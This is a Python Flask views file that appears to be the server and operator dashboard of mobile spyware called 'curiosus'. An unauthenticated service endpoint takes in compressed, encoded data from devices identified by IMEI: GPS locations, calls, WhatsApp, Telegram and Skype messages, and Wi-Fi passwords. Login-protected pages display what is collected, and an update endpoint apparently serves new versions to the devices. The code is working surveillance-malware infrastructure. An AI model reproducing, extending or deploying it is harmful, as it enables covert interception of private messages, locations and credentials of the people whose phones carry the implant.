import base64
import json
import sys
import traceback
import zlib

from flask import (Flask, abort, jsonify, make_response, redirect,
                   render_template, request, session, url_for)

from curiosus import app, db
from curiosus.auth import authenticate, login_required
from curiosus.data import get_last_chat_messages, get_last_devices_locations
from curiosus.forms import LoginForm
from curiosus.handlers import *
from curiosus.models import (ActionLog, Device, Location, SkypeAuthor,
                             SkypeMessage, TelegramAuthor, TelegramMessage,
                             WhatsAppAuthor, WhatsAppMessage, WirelessPassword)
from flask_googlemaps import GoogleMaps, Map

LATEST_VERSION = 5000
LATEST_VERSION_FILE = 'FILE'
LATEST_VERSION_CHECKSUM = 'BANANA'


@app.route('/login', methods=['GET', 'POST'])
def login():
    form = LoginForm()
    if request.method == 'GET':

        return render_template('login.html',
                               title='Sign In',
                               form=form)

    elif request.method == 'POST':
        if form.validate_on_submit():

            user = authenticate(form.email.data, form.password.data)
            if user:
                session['user'] = user
                return redirect(url_for('dashboard'))

        return 'Bad login'


@app.route('/logout', methods=['GET'])
@login_required
def logout():
    if request.method == 'GET':
        session['user'] = None

        return redirect(url_for('login'))


@app.route('/dashboard')
@login_required
def dashboard():

    device_count = Device.query.count()
    messages_count = WhatsAppMessage.query.count() + TelegramMessage.query.count() + SkypeMessage.query.count()
    location_count = Location.query.count()

    last_10_action_log = ActionLog.query.order_by(ActionLog.date.desc()).limit(10)

    password_count = WirelessPassword.query.count()

    device_locations = get_last_devices_locations()

    last_messages = get_last_chat_messages()

    return render_template('dashboard.html',
                           title='Dashboard', last_messages=last_messages, device_locations=device_locations, device_count=device_count, messages_count=messages_count, location_count=location_count, last_10_action_log=last_10_action_log, password_count=password_count)


@app.route('/device/<imei>')
@login_required
def device(imei):

    device = Device.query.filter_by(imei=imei).first()
    last_location = device.locations.order_by(Location.date.desc()).limit(1).first()

    mymap = Map(style="height:400px;width:900px;margin:0;", identifier='tracking', lat=float(last_location.latitude), lng=float(last_location.longitude), markers=[{'lat': float(l.latitude), 'lng': float(l.longitude), 'infobox': '<p>Date: {}</p><br><p>Device: {}</p><p>Battery: {}<p>Provider: {}</p>'.format(l.date, l.device.imei, l.battery, l.provider)} for l in device.locations.all()])

    return render_template('device.html',
                           title='Dashboard', mymap=mymap, device=device)


@app.route('/devices')
@login_required
def devices():

    device_list = Device.query.all()

    return render_template('device_list.html',
                           title='Dashboard', device_list=device_list)


@app.route('/actionlog')
@login_required
def actionlog():

    actionlog_list = ActionLog.query.all()

    return render_template('actionlog.html',
                           title='Dashboard', actionlog_list=actionlog_list)


@app.route('/messages/all/<imei>')
@app.route('/messages/all')
@login_required
def messages(imei=None):

    if not imei:
        messages = []
        messages += [{'source': 'Telegram', 'text': m.text, 'date': m.date, 'author': m.author.fullname, 'id': m.id, 'imei': m.device.imei, 'number': m.device.number} for m in TelegramMessage.query.all()]
        messages += [{'source': 'WhatsApp', 'text': m.text, 'date': m.date, 'author': m.author.fullname, 'id': m.id, 'imei': m.device.imei, 'number': m.device.number} for m in WhatsAppMessage.query.all()]
        messages += [{'source': 'Skype', 'text': m.text, 'date': m.date, 'author': m.author.username, 'id': m.id, 'imei': m.device.imei, 'number': m.device.number} for m in SkypeMessage.query.all()]

    else:
        messages = []
        messages += [{'source': 'Telegram', 'text': m.text, 'date': m.date, 'author': m.author.fullname, 'id': m.id, 'imei': m.device.imei, 'number': m.device.number} for m in TelegramMessage.query.filter_by(device_imei=imei).all()]
        messages += [{'source': 'WhatsApp', 'text': m.text, 'date': m.date, 'author': m.author.fullname, 'id': m.id, 'imei': m.device.imei, 'number': m.device.number} for m in WhatsAppMessage.query.filter_by(device_imei=imei).all()]
        messages += [{'source': 'Skype', 'text': m.text, 'date': m.date, 'author': m.author.username, 'id': m.id, 'imei': m.device.imei, 'number': m.device.number} for m in SkypeMessage.query.filter_by(device_imei=imei).all()]

    return render_template('messages.html',
                           title='Dashboard', messages=messages)


@app.route('/messages/telegram/<imei>')
@app.route('/messages/telegram')
@login_required
def messages_telegram(imei=None):

    if not imei:
        messages = TelegramMessage.query.all()
    else:
        messages = TelegramMessage.query.filter_by(device_imei=imei).all()

    return render_template('messages_telegram.html',
                           title='Dashboard', messages=messages)


@app.route('/messages/skype/<imei>')
@app.route('/messages/skype')
@login_required
def messages_skype(imei=None):

    if not imei:
        messages = SkypeMessage.query.all()
    else:
        messages = SkypeMessage.query.filter_by(device_imei=imei).all()

    return render_template('messages_skype.html',
                           title='Dashboard', messages=messages)


@app.route('/messages/whatsapp/<imei>')
@app.route('/messages/whatsapp')
@login_required
def messages_whatsapp(imei=None):

    if not imei:
        messages = WhatsAppMessage.query.all()
    else:
        messages = WhatsAppMessage.query.filter_by(device_imei=imei).all()

    return render_template('messages_whatsapp.html',
                           title='Dashboard', messages=messages)


@app.route('/passwords/wireless')
@login_required
def passwords_wireless():

    wirelesspass_list = WirelessPassword.query.all()

    return render_template('wireless_password_list.html',
                           title='Dashboard', wirelesspass_list=wirelesspass_list)


@app.route('/api/v1/version')
def version():
    return jsonify({'version': LATEST_VERSION, 'file': LATEST_VERSION_FILE, 'sha256': LATEST_VERSION_CHECKSUM})


@app.route('/api/v1/update')
def update():
    return 'ok'


@app.route('/api/v1/service', methods=['GET', 'POST'])
def service():
    if not request.json:
        abort(400)
    module = request.headers.get('Endpoint')
    print('Got request for endpoint {}'.format(module))
    body = json.loads(zlib.decompress(base64.b64decode(request.json.get('data')), zlib.MAX_WBITS | 16).decode('utf-8'))
    if module in ['DEVICE_INFO']:
        handle_device_info(body)
        return 'ok'
    elif module in ['SETTINGS_SEND']:
        # print(data)
        return 'ok'

    try:
        if module in ['GPS', 'ONLINE_LOCATION']:
            handle_location(body)
        elif module in ['WA']:
            handle_whatsapp(body)
        elif module in ['TELEGRAM']:
            handle_telegram(body)
        elif module in ['CALL']:
            handle_call(body)
        elif module in ['SKYPE']:
            handle_skype(body)
        elif module in ['WIRELESS_PASSWORD']:
            handle_wireless_password(body)
    except Exception as e:
        traceback.print_exc()
    return 'ok'
